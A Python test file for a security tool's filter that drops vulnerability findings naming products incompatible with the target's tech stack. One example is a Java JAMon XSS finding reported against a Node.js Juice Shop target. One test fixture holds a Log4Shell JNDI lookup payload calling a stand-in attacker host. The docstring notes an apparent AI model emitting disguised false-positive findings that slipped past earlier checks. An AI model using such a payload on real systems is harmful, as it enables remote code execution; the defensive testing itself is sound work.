"""F183 — Generalize applicability filter beyond CVE-shaped rule_ids.

F182 bench surfaced an evasion: the model was emitting findings with
``rule_id="WEB-XSS-001"`` (non-CVE shape) whose ``message`` /
``evidence`` still cited a wrong-stack product (``JAMonAdmin.jsp`` on
a Node.js target). F173/F180 only fire for ``rule_id`` matching the
``CVE-XXXX-XXXX`` shape, so the disguised FP bypassed all gates.

F183 generalizes the filter: extract product mentions from the
finding's text fields and compare against the target tech stack.
Drop when a product mention is incompatible with the stack — no
matter what shape the rule_id has.

Conservative defaults preserved:
* No product mention in text → pass (most legit findings like
  ``Missing-CSP`` don't name products)
* Empty tech stack → pass
* Disabled via ``KRYON_FINDING_APPLICABILITY=false``
"""

from __future__ import annotations

import pytest

from kryon.validation.finding_applicability import (
    extract_product_mentions,
    is_finding_applicable_general,
)


# ---------------------------------------------------------------------------
# extract_product_mentions — text scanning
# ---------------------------------------------------------------------------


def test_extract_jamon_from_message():
    mentions = extract_product_mentions(
        "Reflected XSS in JAMonAdmin.jsp parameter on /admin endpoint"
    )
    assert "jamon" in mentions


def test_extract_jamon_from_evidence_lower_case():
    mentions = extract_product_mentions(
        "según output de nikto: jamon admin interface identified"
    )
    assert "jamon" in mentions


def test_extract_multiple_products():
    mentions = extract_product_mentions(
        "Apache Struts2 vulnerable to OGNL injection, also Log4j present"
    )
    assert "struts" in mentions
    assert "log4j" in mentions


def test_extract_no_product_returns_empty():
    """Generic message with no product keyword → empty."""
    mentions = extract_product_mentions(
        "Content-Security-Policy header missing on the response."
    )
    assert mentions == set()


def test_extract_empty_input():
    assert extract_product_mentions("") == set()
    assert extract_product_mentions(None) == set()  # type: ignore[arg-type]


def test_extract_does_not_match_generic_words():
    """``apache`` as a substring of ``apaches`` (plural) shouldn't fire,
    nor should it match inside an unrelated word. Word-boundary regex."""
    mentions = extract_product_mentions("apachelore software")
    # Should NOT match — the keyword pattern requires word boundary.
    assert "apache" not in mentions


# ---------------------------------------------------------------------------
# is_finding_applicable_general — the gate
# ---------------------------------------------------------------------------


def test_f182_disguised_jamon_xss_dropped():
    """The exact F182 evasion: rule_id is not CVE-shaped but the
    finding cites a Java-only product on a Node.js target."""
    finding = {
        "rule_id": "WEB-XSS-001",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "host": "http://juice_shop:3000",
        "message": "Interfaz JAMonAdmin.jsp contiene vulnerabilidad XSS reflejada.",
        "evidence": "según output de Nikto: JAMonAdmin.jsp identified",
    }
    ok, reason = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is False
    assert "jamon" in reason.lower() or "mismatch" in reason.lower()


def test_struts2_finding_on_node_target_dropped():
    finding = {
        "rule_id": "EXPLOIT-RCE-1",
        "host": "http://juice_shop:3000",
        "message": "Apache Struts2 vulnerable to OGNL injection",
        "evidence": "POST /struts/action.action",
    }
    ok, _ = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is False


def test_log4j_on_php_target_dropped():
    finding = {
        "rule_id": "RCE-LOG4J",
        "host": "http://dvwa:80/index.php",
        "message": "Log4j vulnerable to JNDI lookup",
        "evidence": "${jndi:ldap://attacker.com/x}",
    }
    ok, _ = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is False


# ---------------------------------------------------------------------------
# Conservative passes
# ---------------------------------------------------------------------------


def test_missing_csp_passes():
    """Generic security-header findings have no product mention →
    pass unconditionally, this gate is product-specific."""
    finding = {
        "rule_id": "Missing-CSP",
        "host": "http://juice_shop:3000",
        "message": "Content-Security-Policy header missing",
        "evidence": "según output de curl -I",
    }
    ok, reason = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is True
    assert "no product mention" in reason.lower() or "passing" in reason.lower()


def test_express_finding_on_juice_shop_passes():
    """Mentioning a product that IS in the stack → pass."""
    finding = {
        "rule_id": "EXPRESS-XSS",
        "host": "http://juice_shop:3000",
        "message": "Express middleware misconfiguration allowing XSS",
        "evidence": "X-Powered-By: Express",
    }
    ok, _ = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is True


def test_unknown_host_falls_through_to_caller_stack():
    finding = {
        "rule_id": "STRUTS-RCE",
        "host": "http://custom-app.example.com",
        "message": "Apache Struts2 RCE",
    }
    # No caller stack + unknown host → conservative pass (no data to
    # disprove applicability).
    ok, _ = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is True


def test_filter_disabled_via_env(monkeypatch):
    monkeypatch.setenv("KRYON_FINDING_APPLICABILITY", "false")
    finding = {
        "rule_id": "WEB-XSS-001",
        "host": "http://juice_shop:3000",
        "message": "JAMonAdmin.jsp vulnerable",
    }
    ok, reason = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is True
    assert "disabled" in reason.lower()


# ---------------------------------------------------------------------------
# Multi-product findings — match wins
# ---------------------------------------------------------------------------


def test_finding_mentioning_both_stack_match_and_mismatch_passes():
    """If the finding mentions Express (matches Node) AND JAMon
    (doesn't), the match wins — we don't want to over-aggressively
    drop legit findings that name multiple things."""
    finding = {
        "rule_id": "VULN-001",
        "host": "http://juice_shop:3000",
        "message": "Express app exposes /JAMonAdmin.jsp through misconfig",
    }
    ok, _ = is_finding_applicable_general(finding, tech_stack=set())
    assert ok is True


def test_dataclass_compatible():
    """Should also accept Finding-like dataclass instances."""
    class _F:
        rule_id = "WEB-XSS-001"
        host = "http://juice_shop:3000"
        message = "JAMon XSS issue"
        evidence = ""

    ok, _ = is_finding_applicable_general(_F(), tech_stack=set())
    assert ok is False
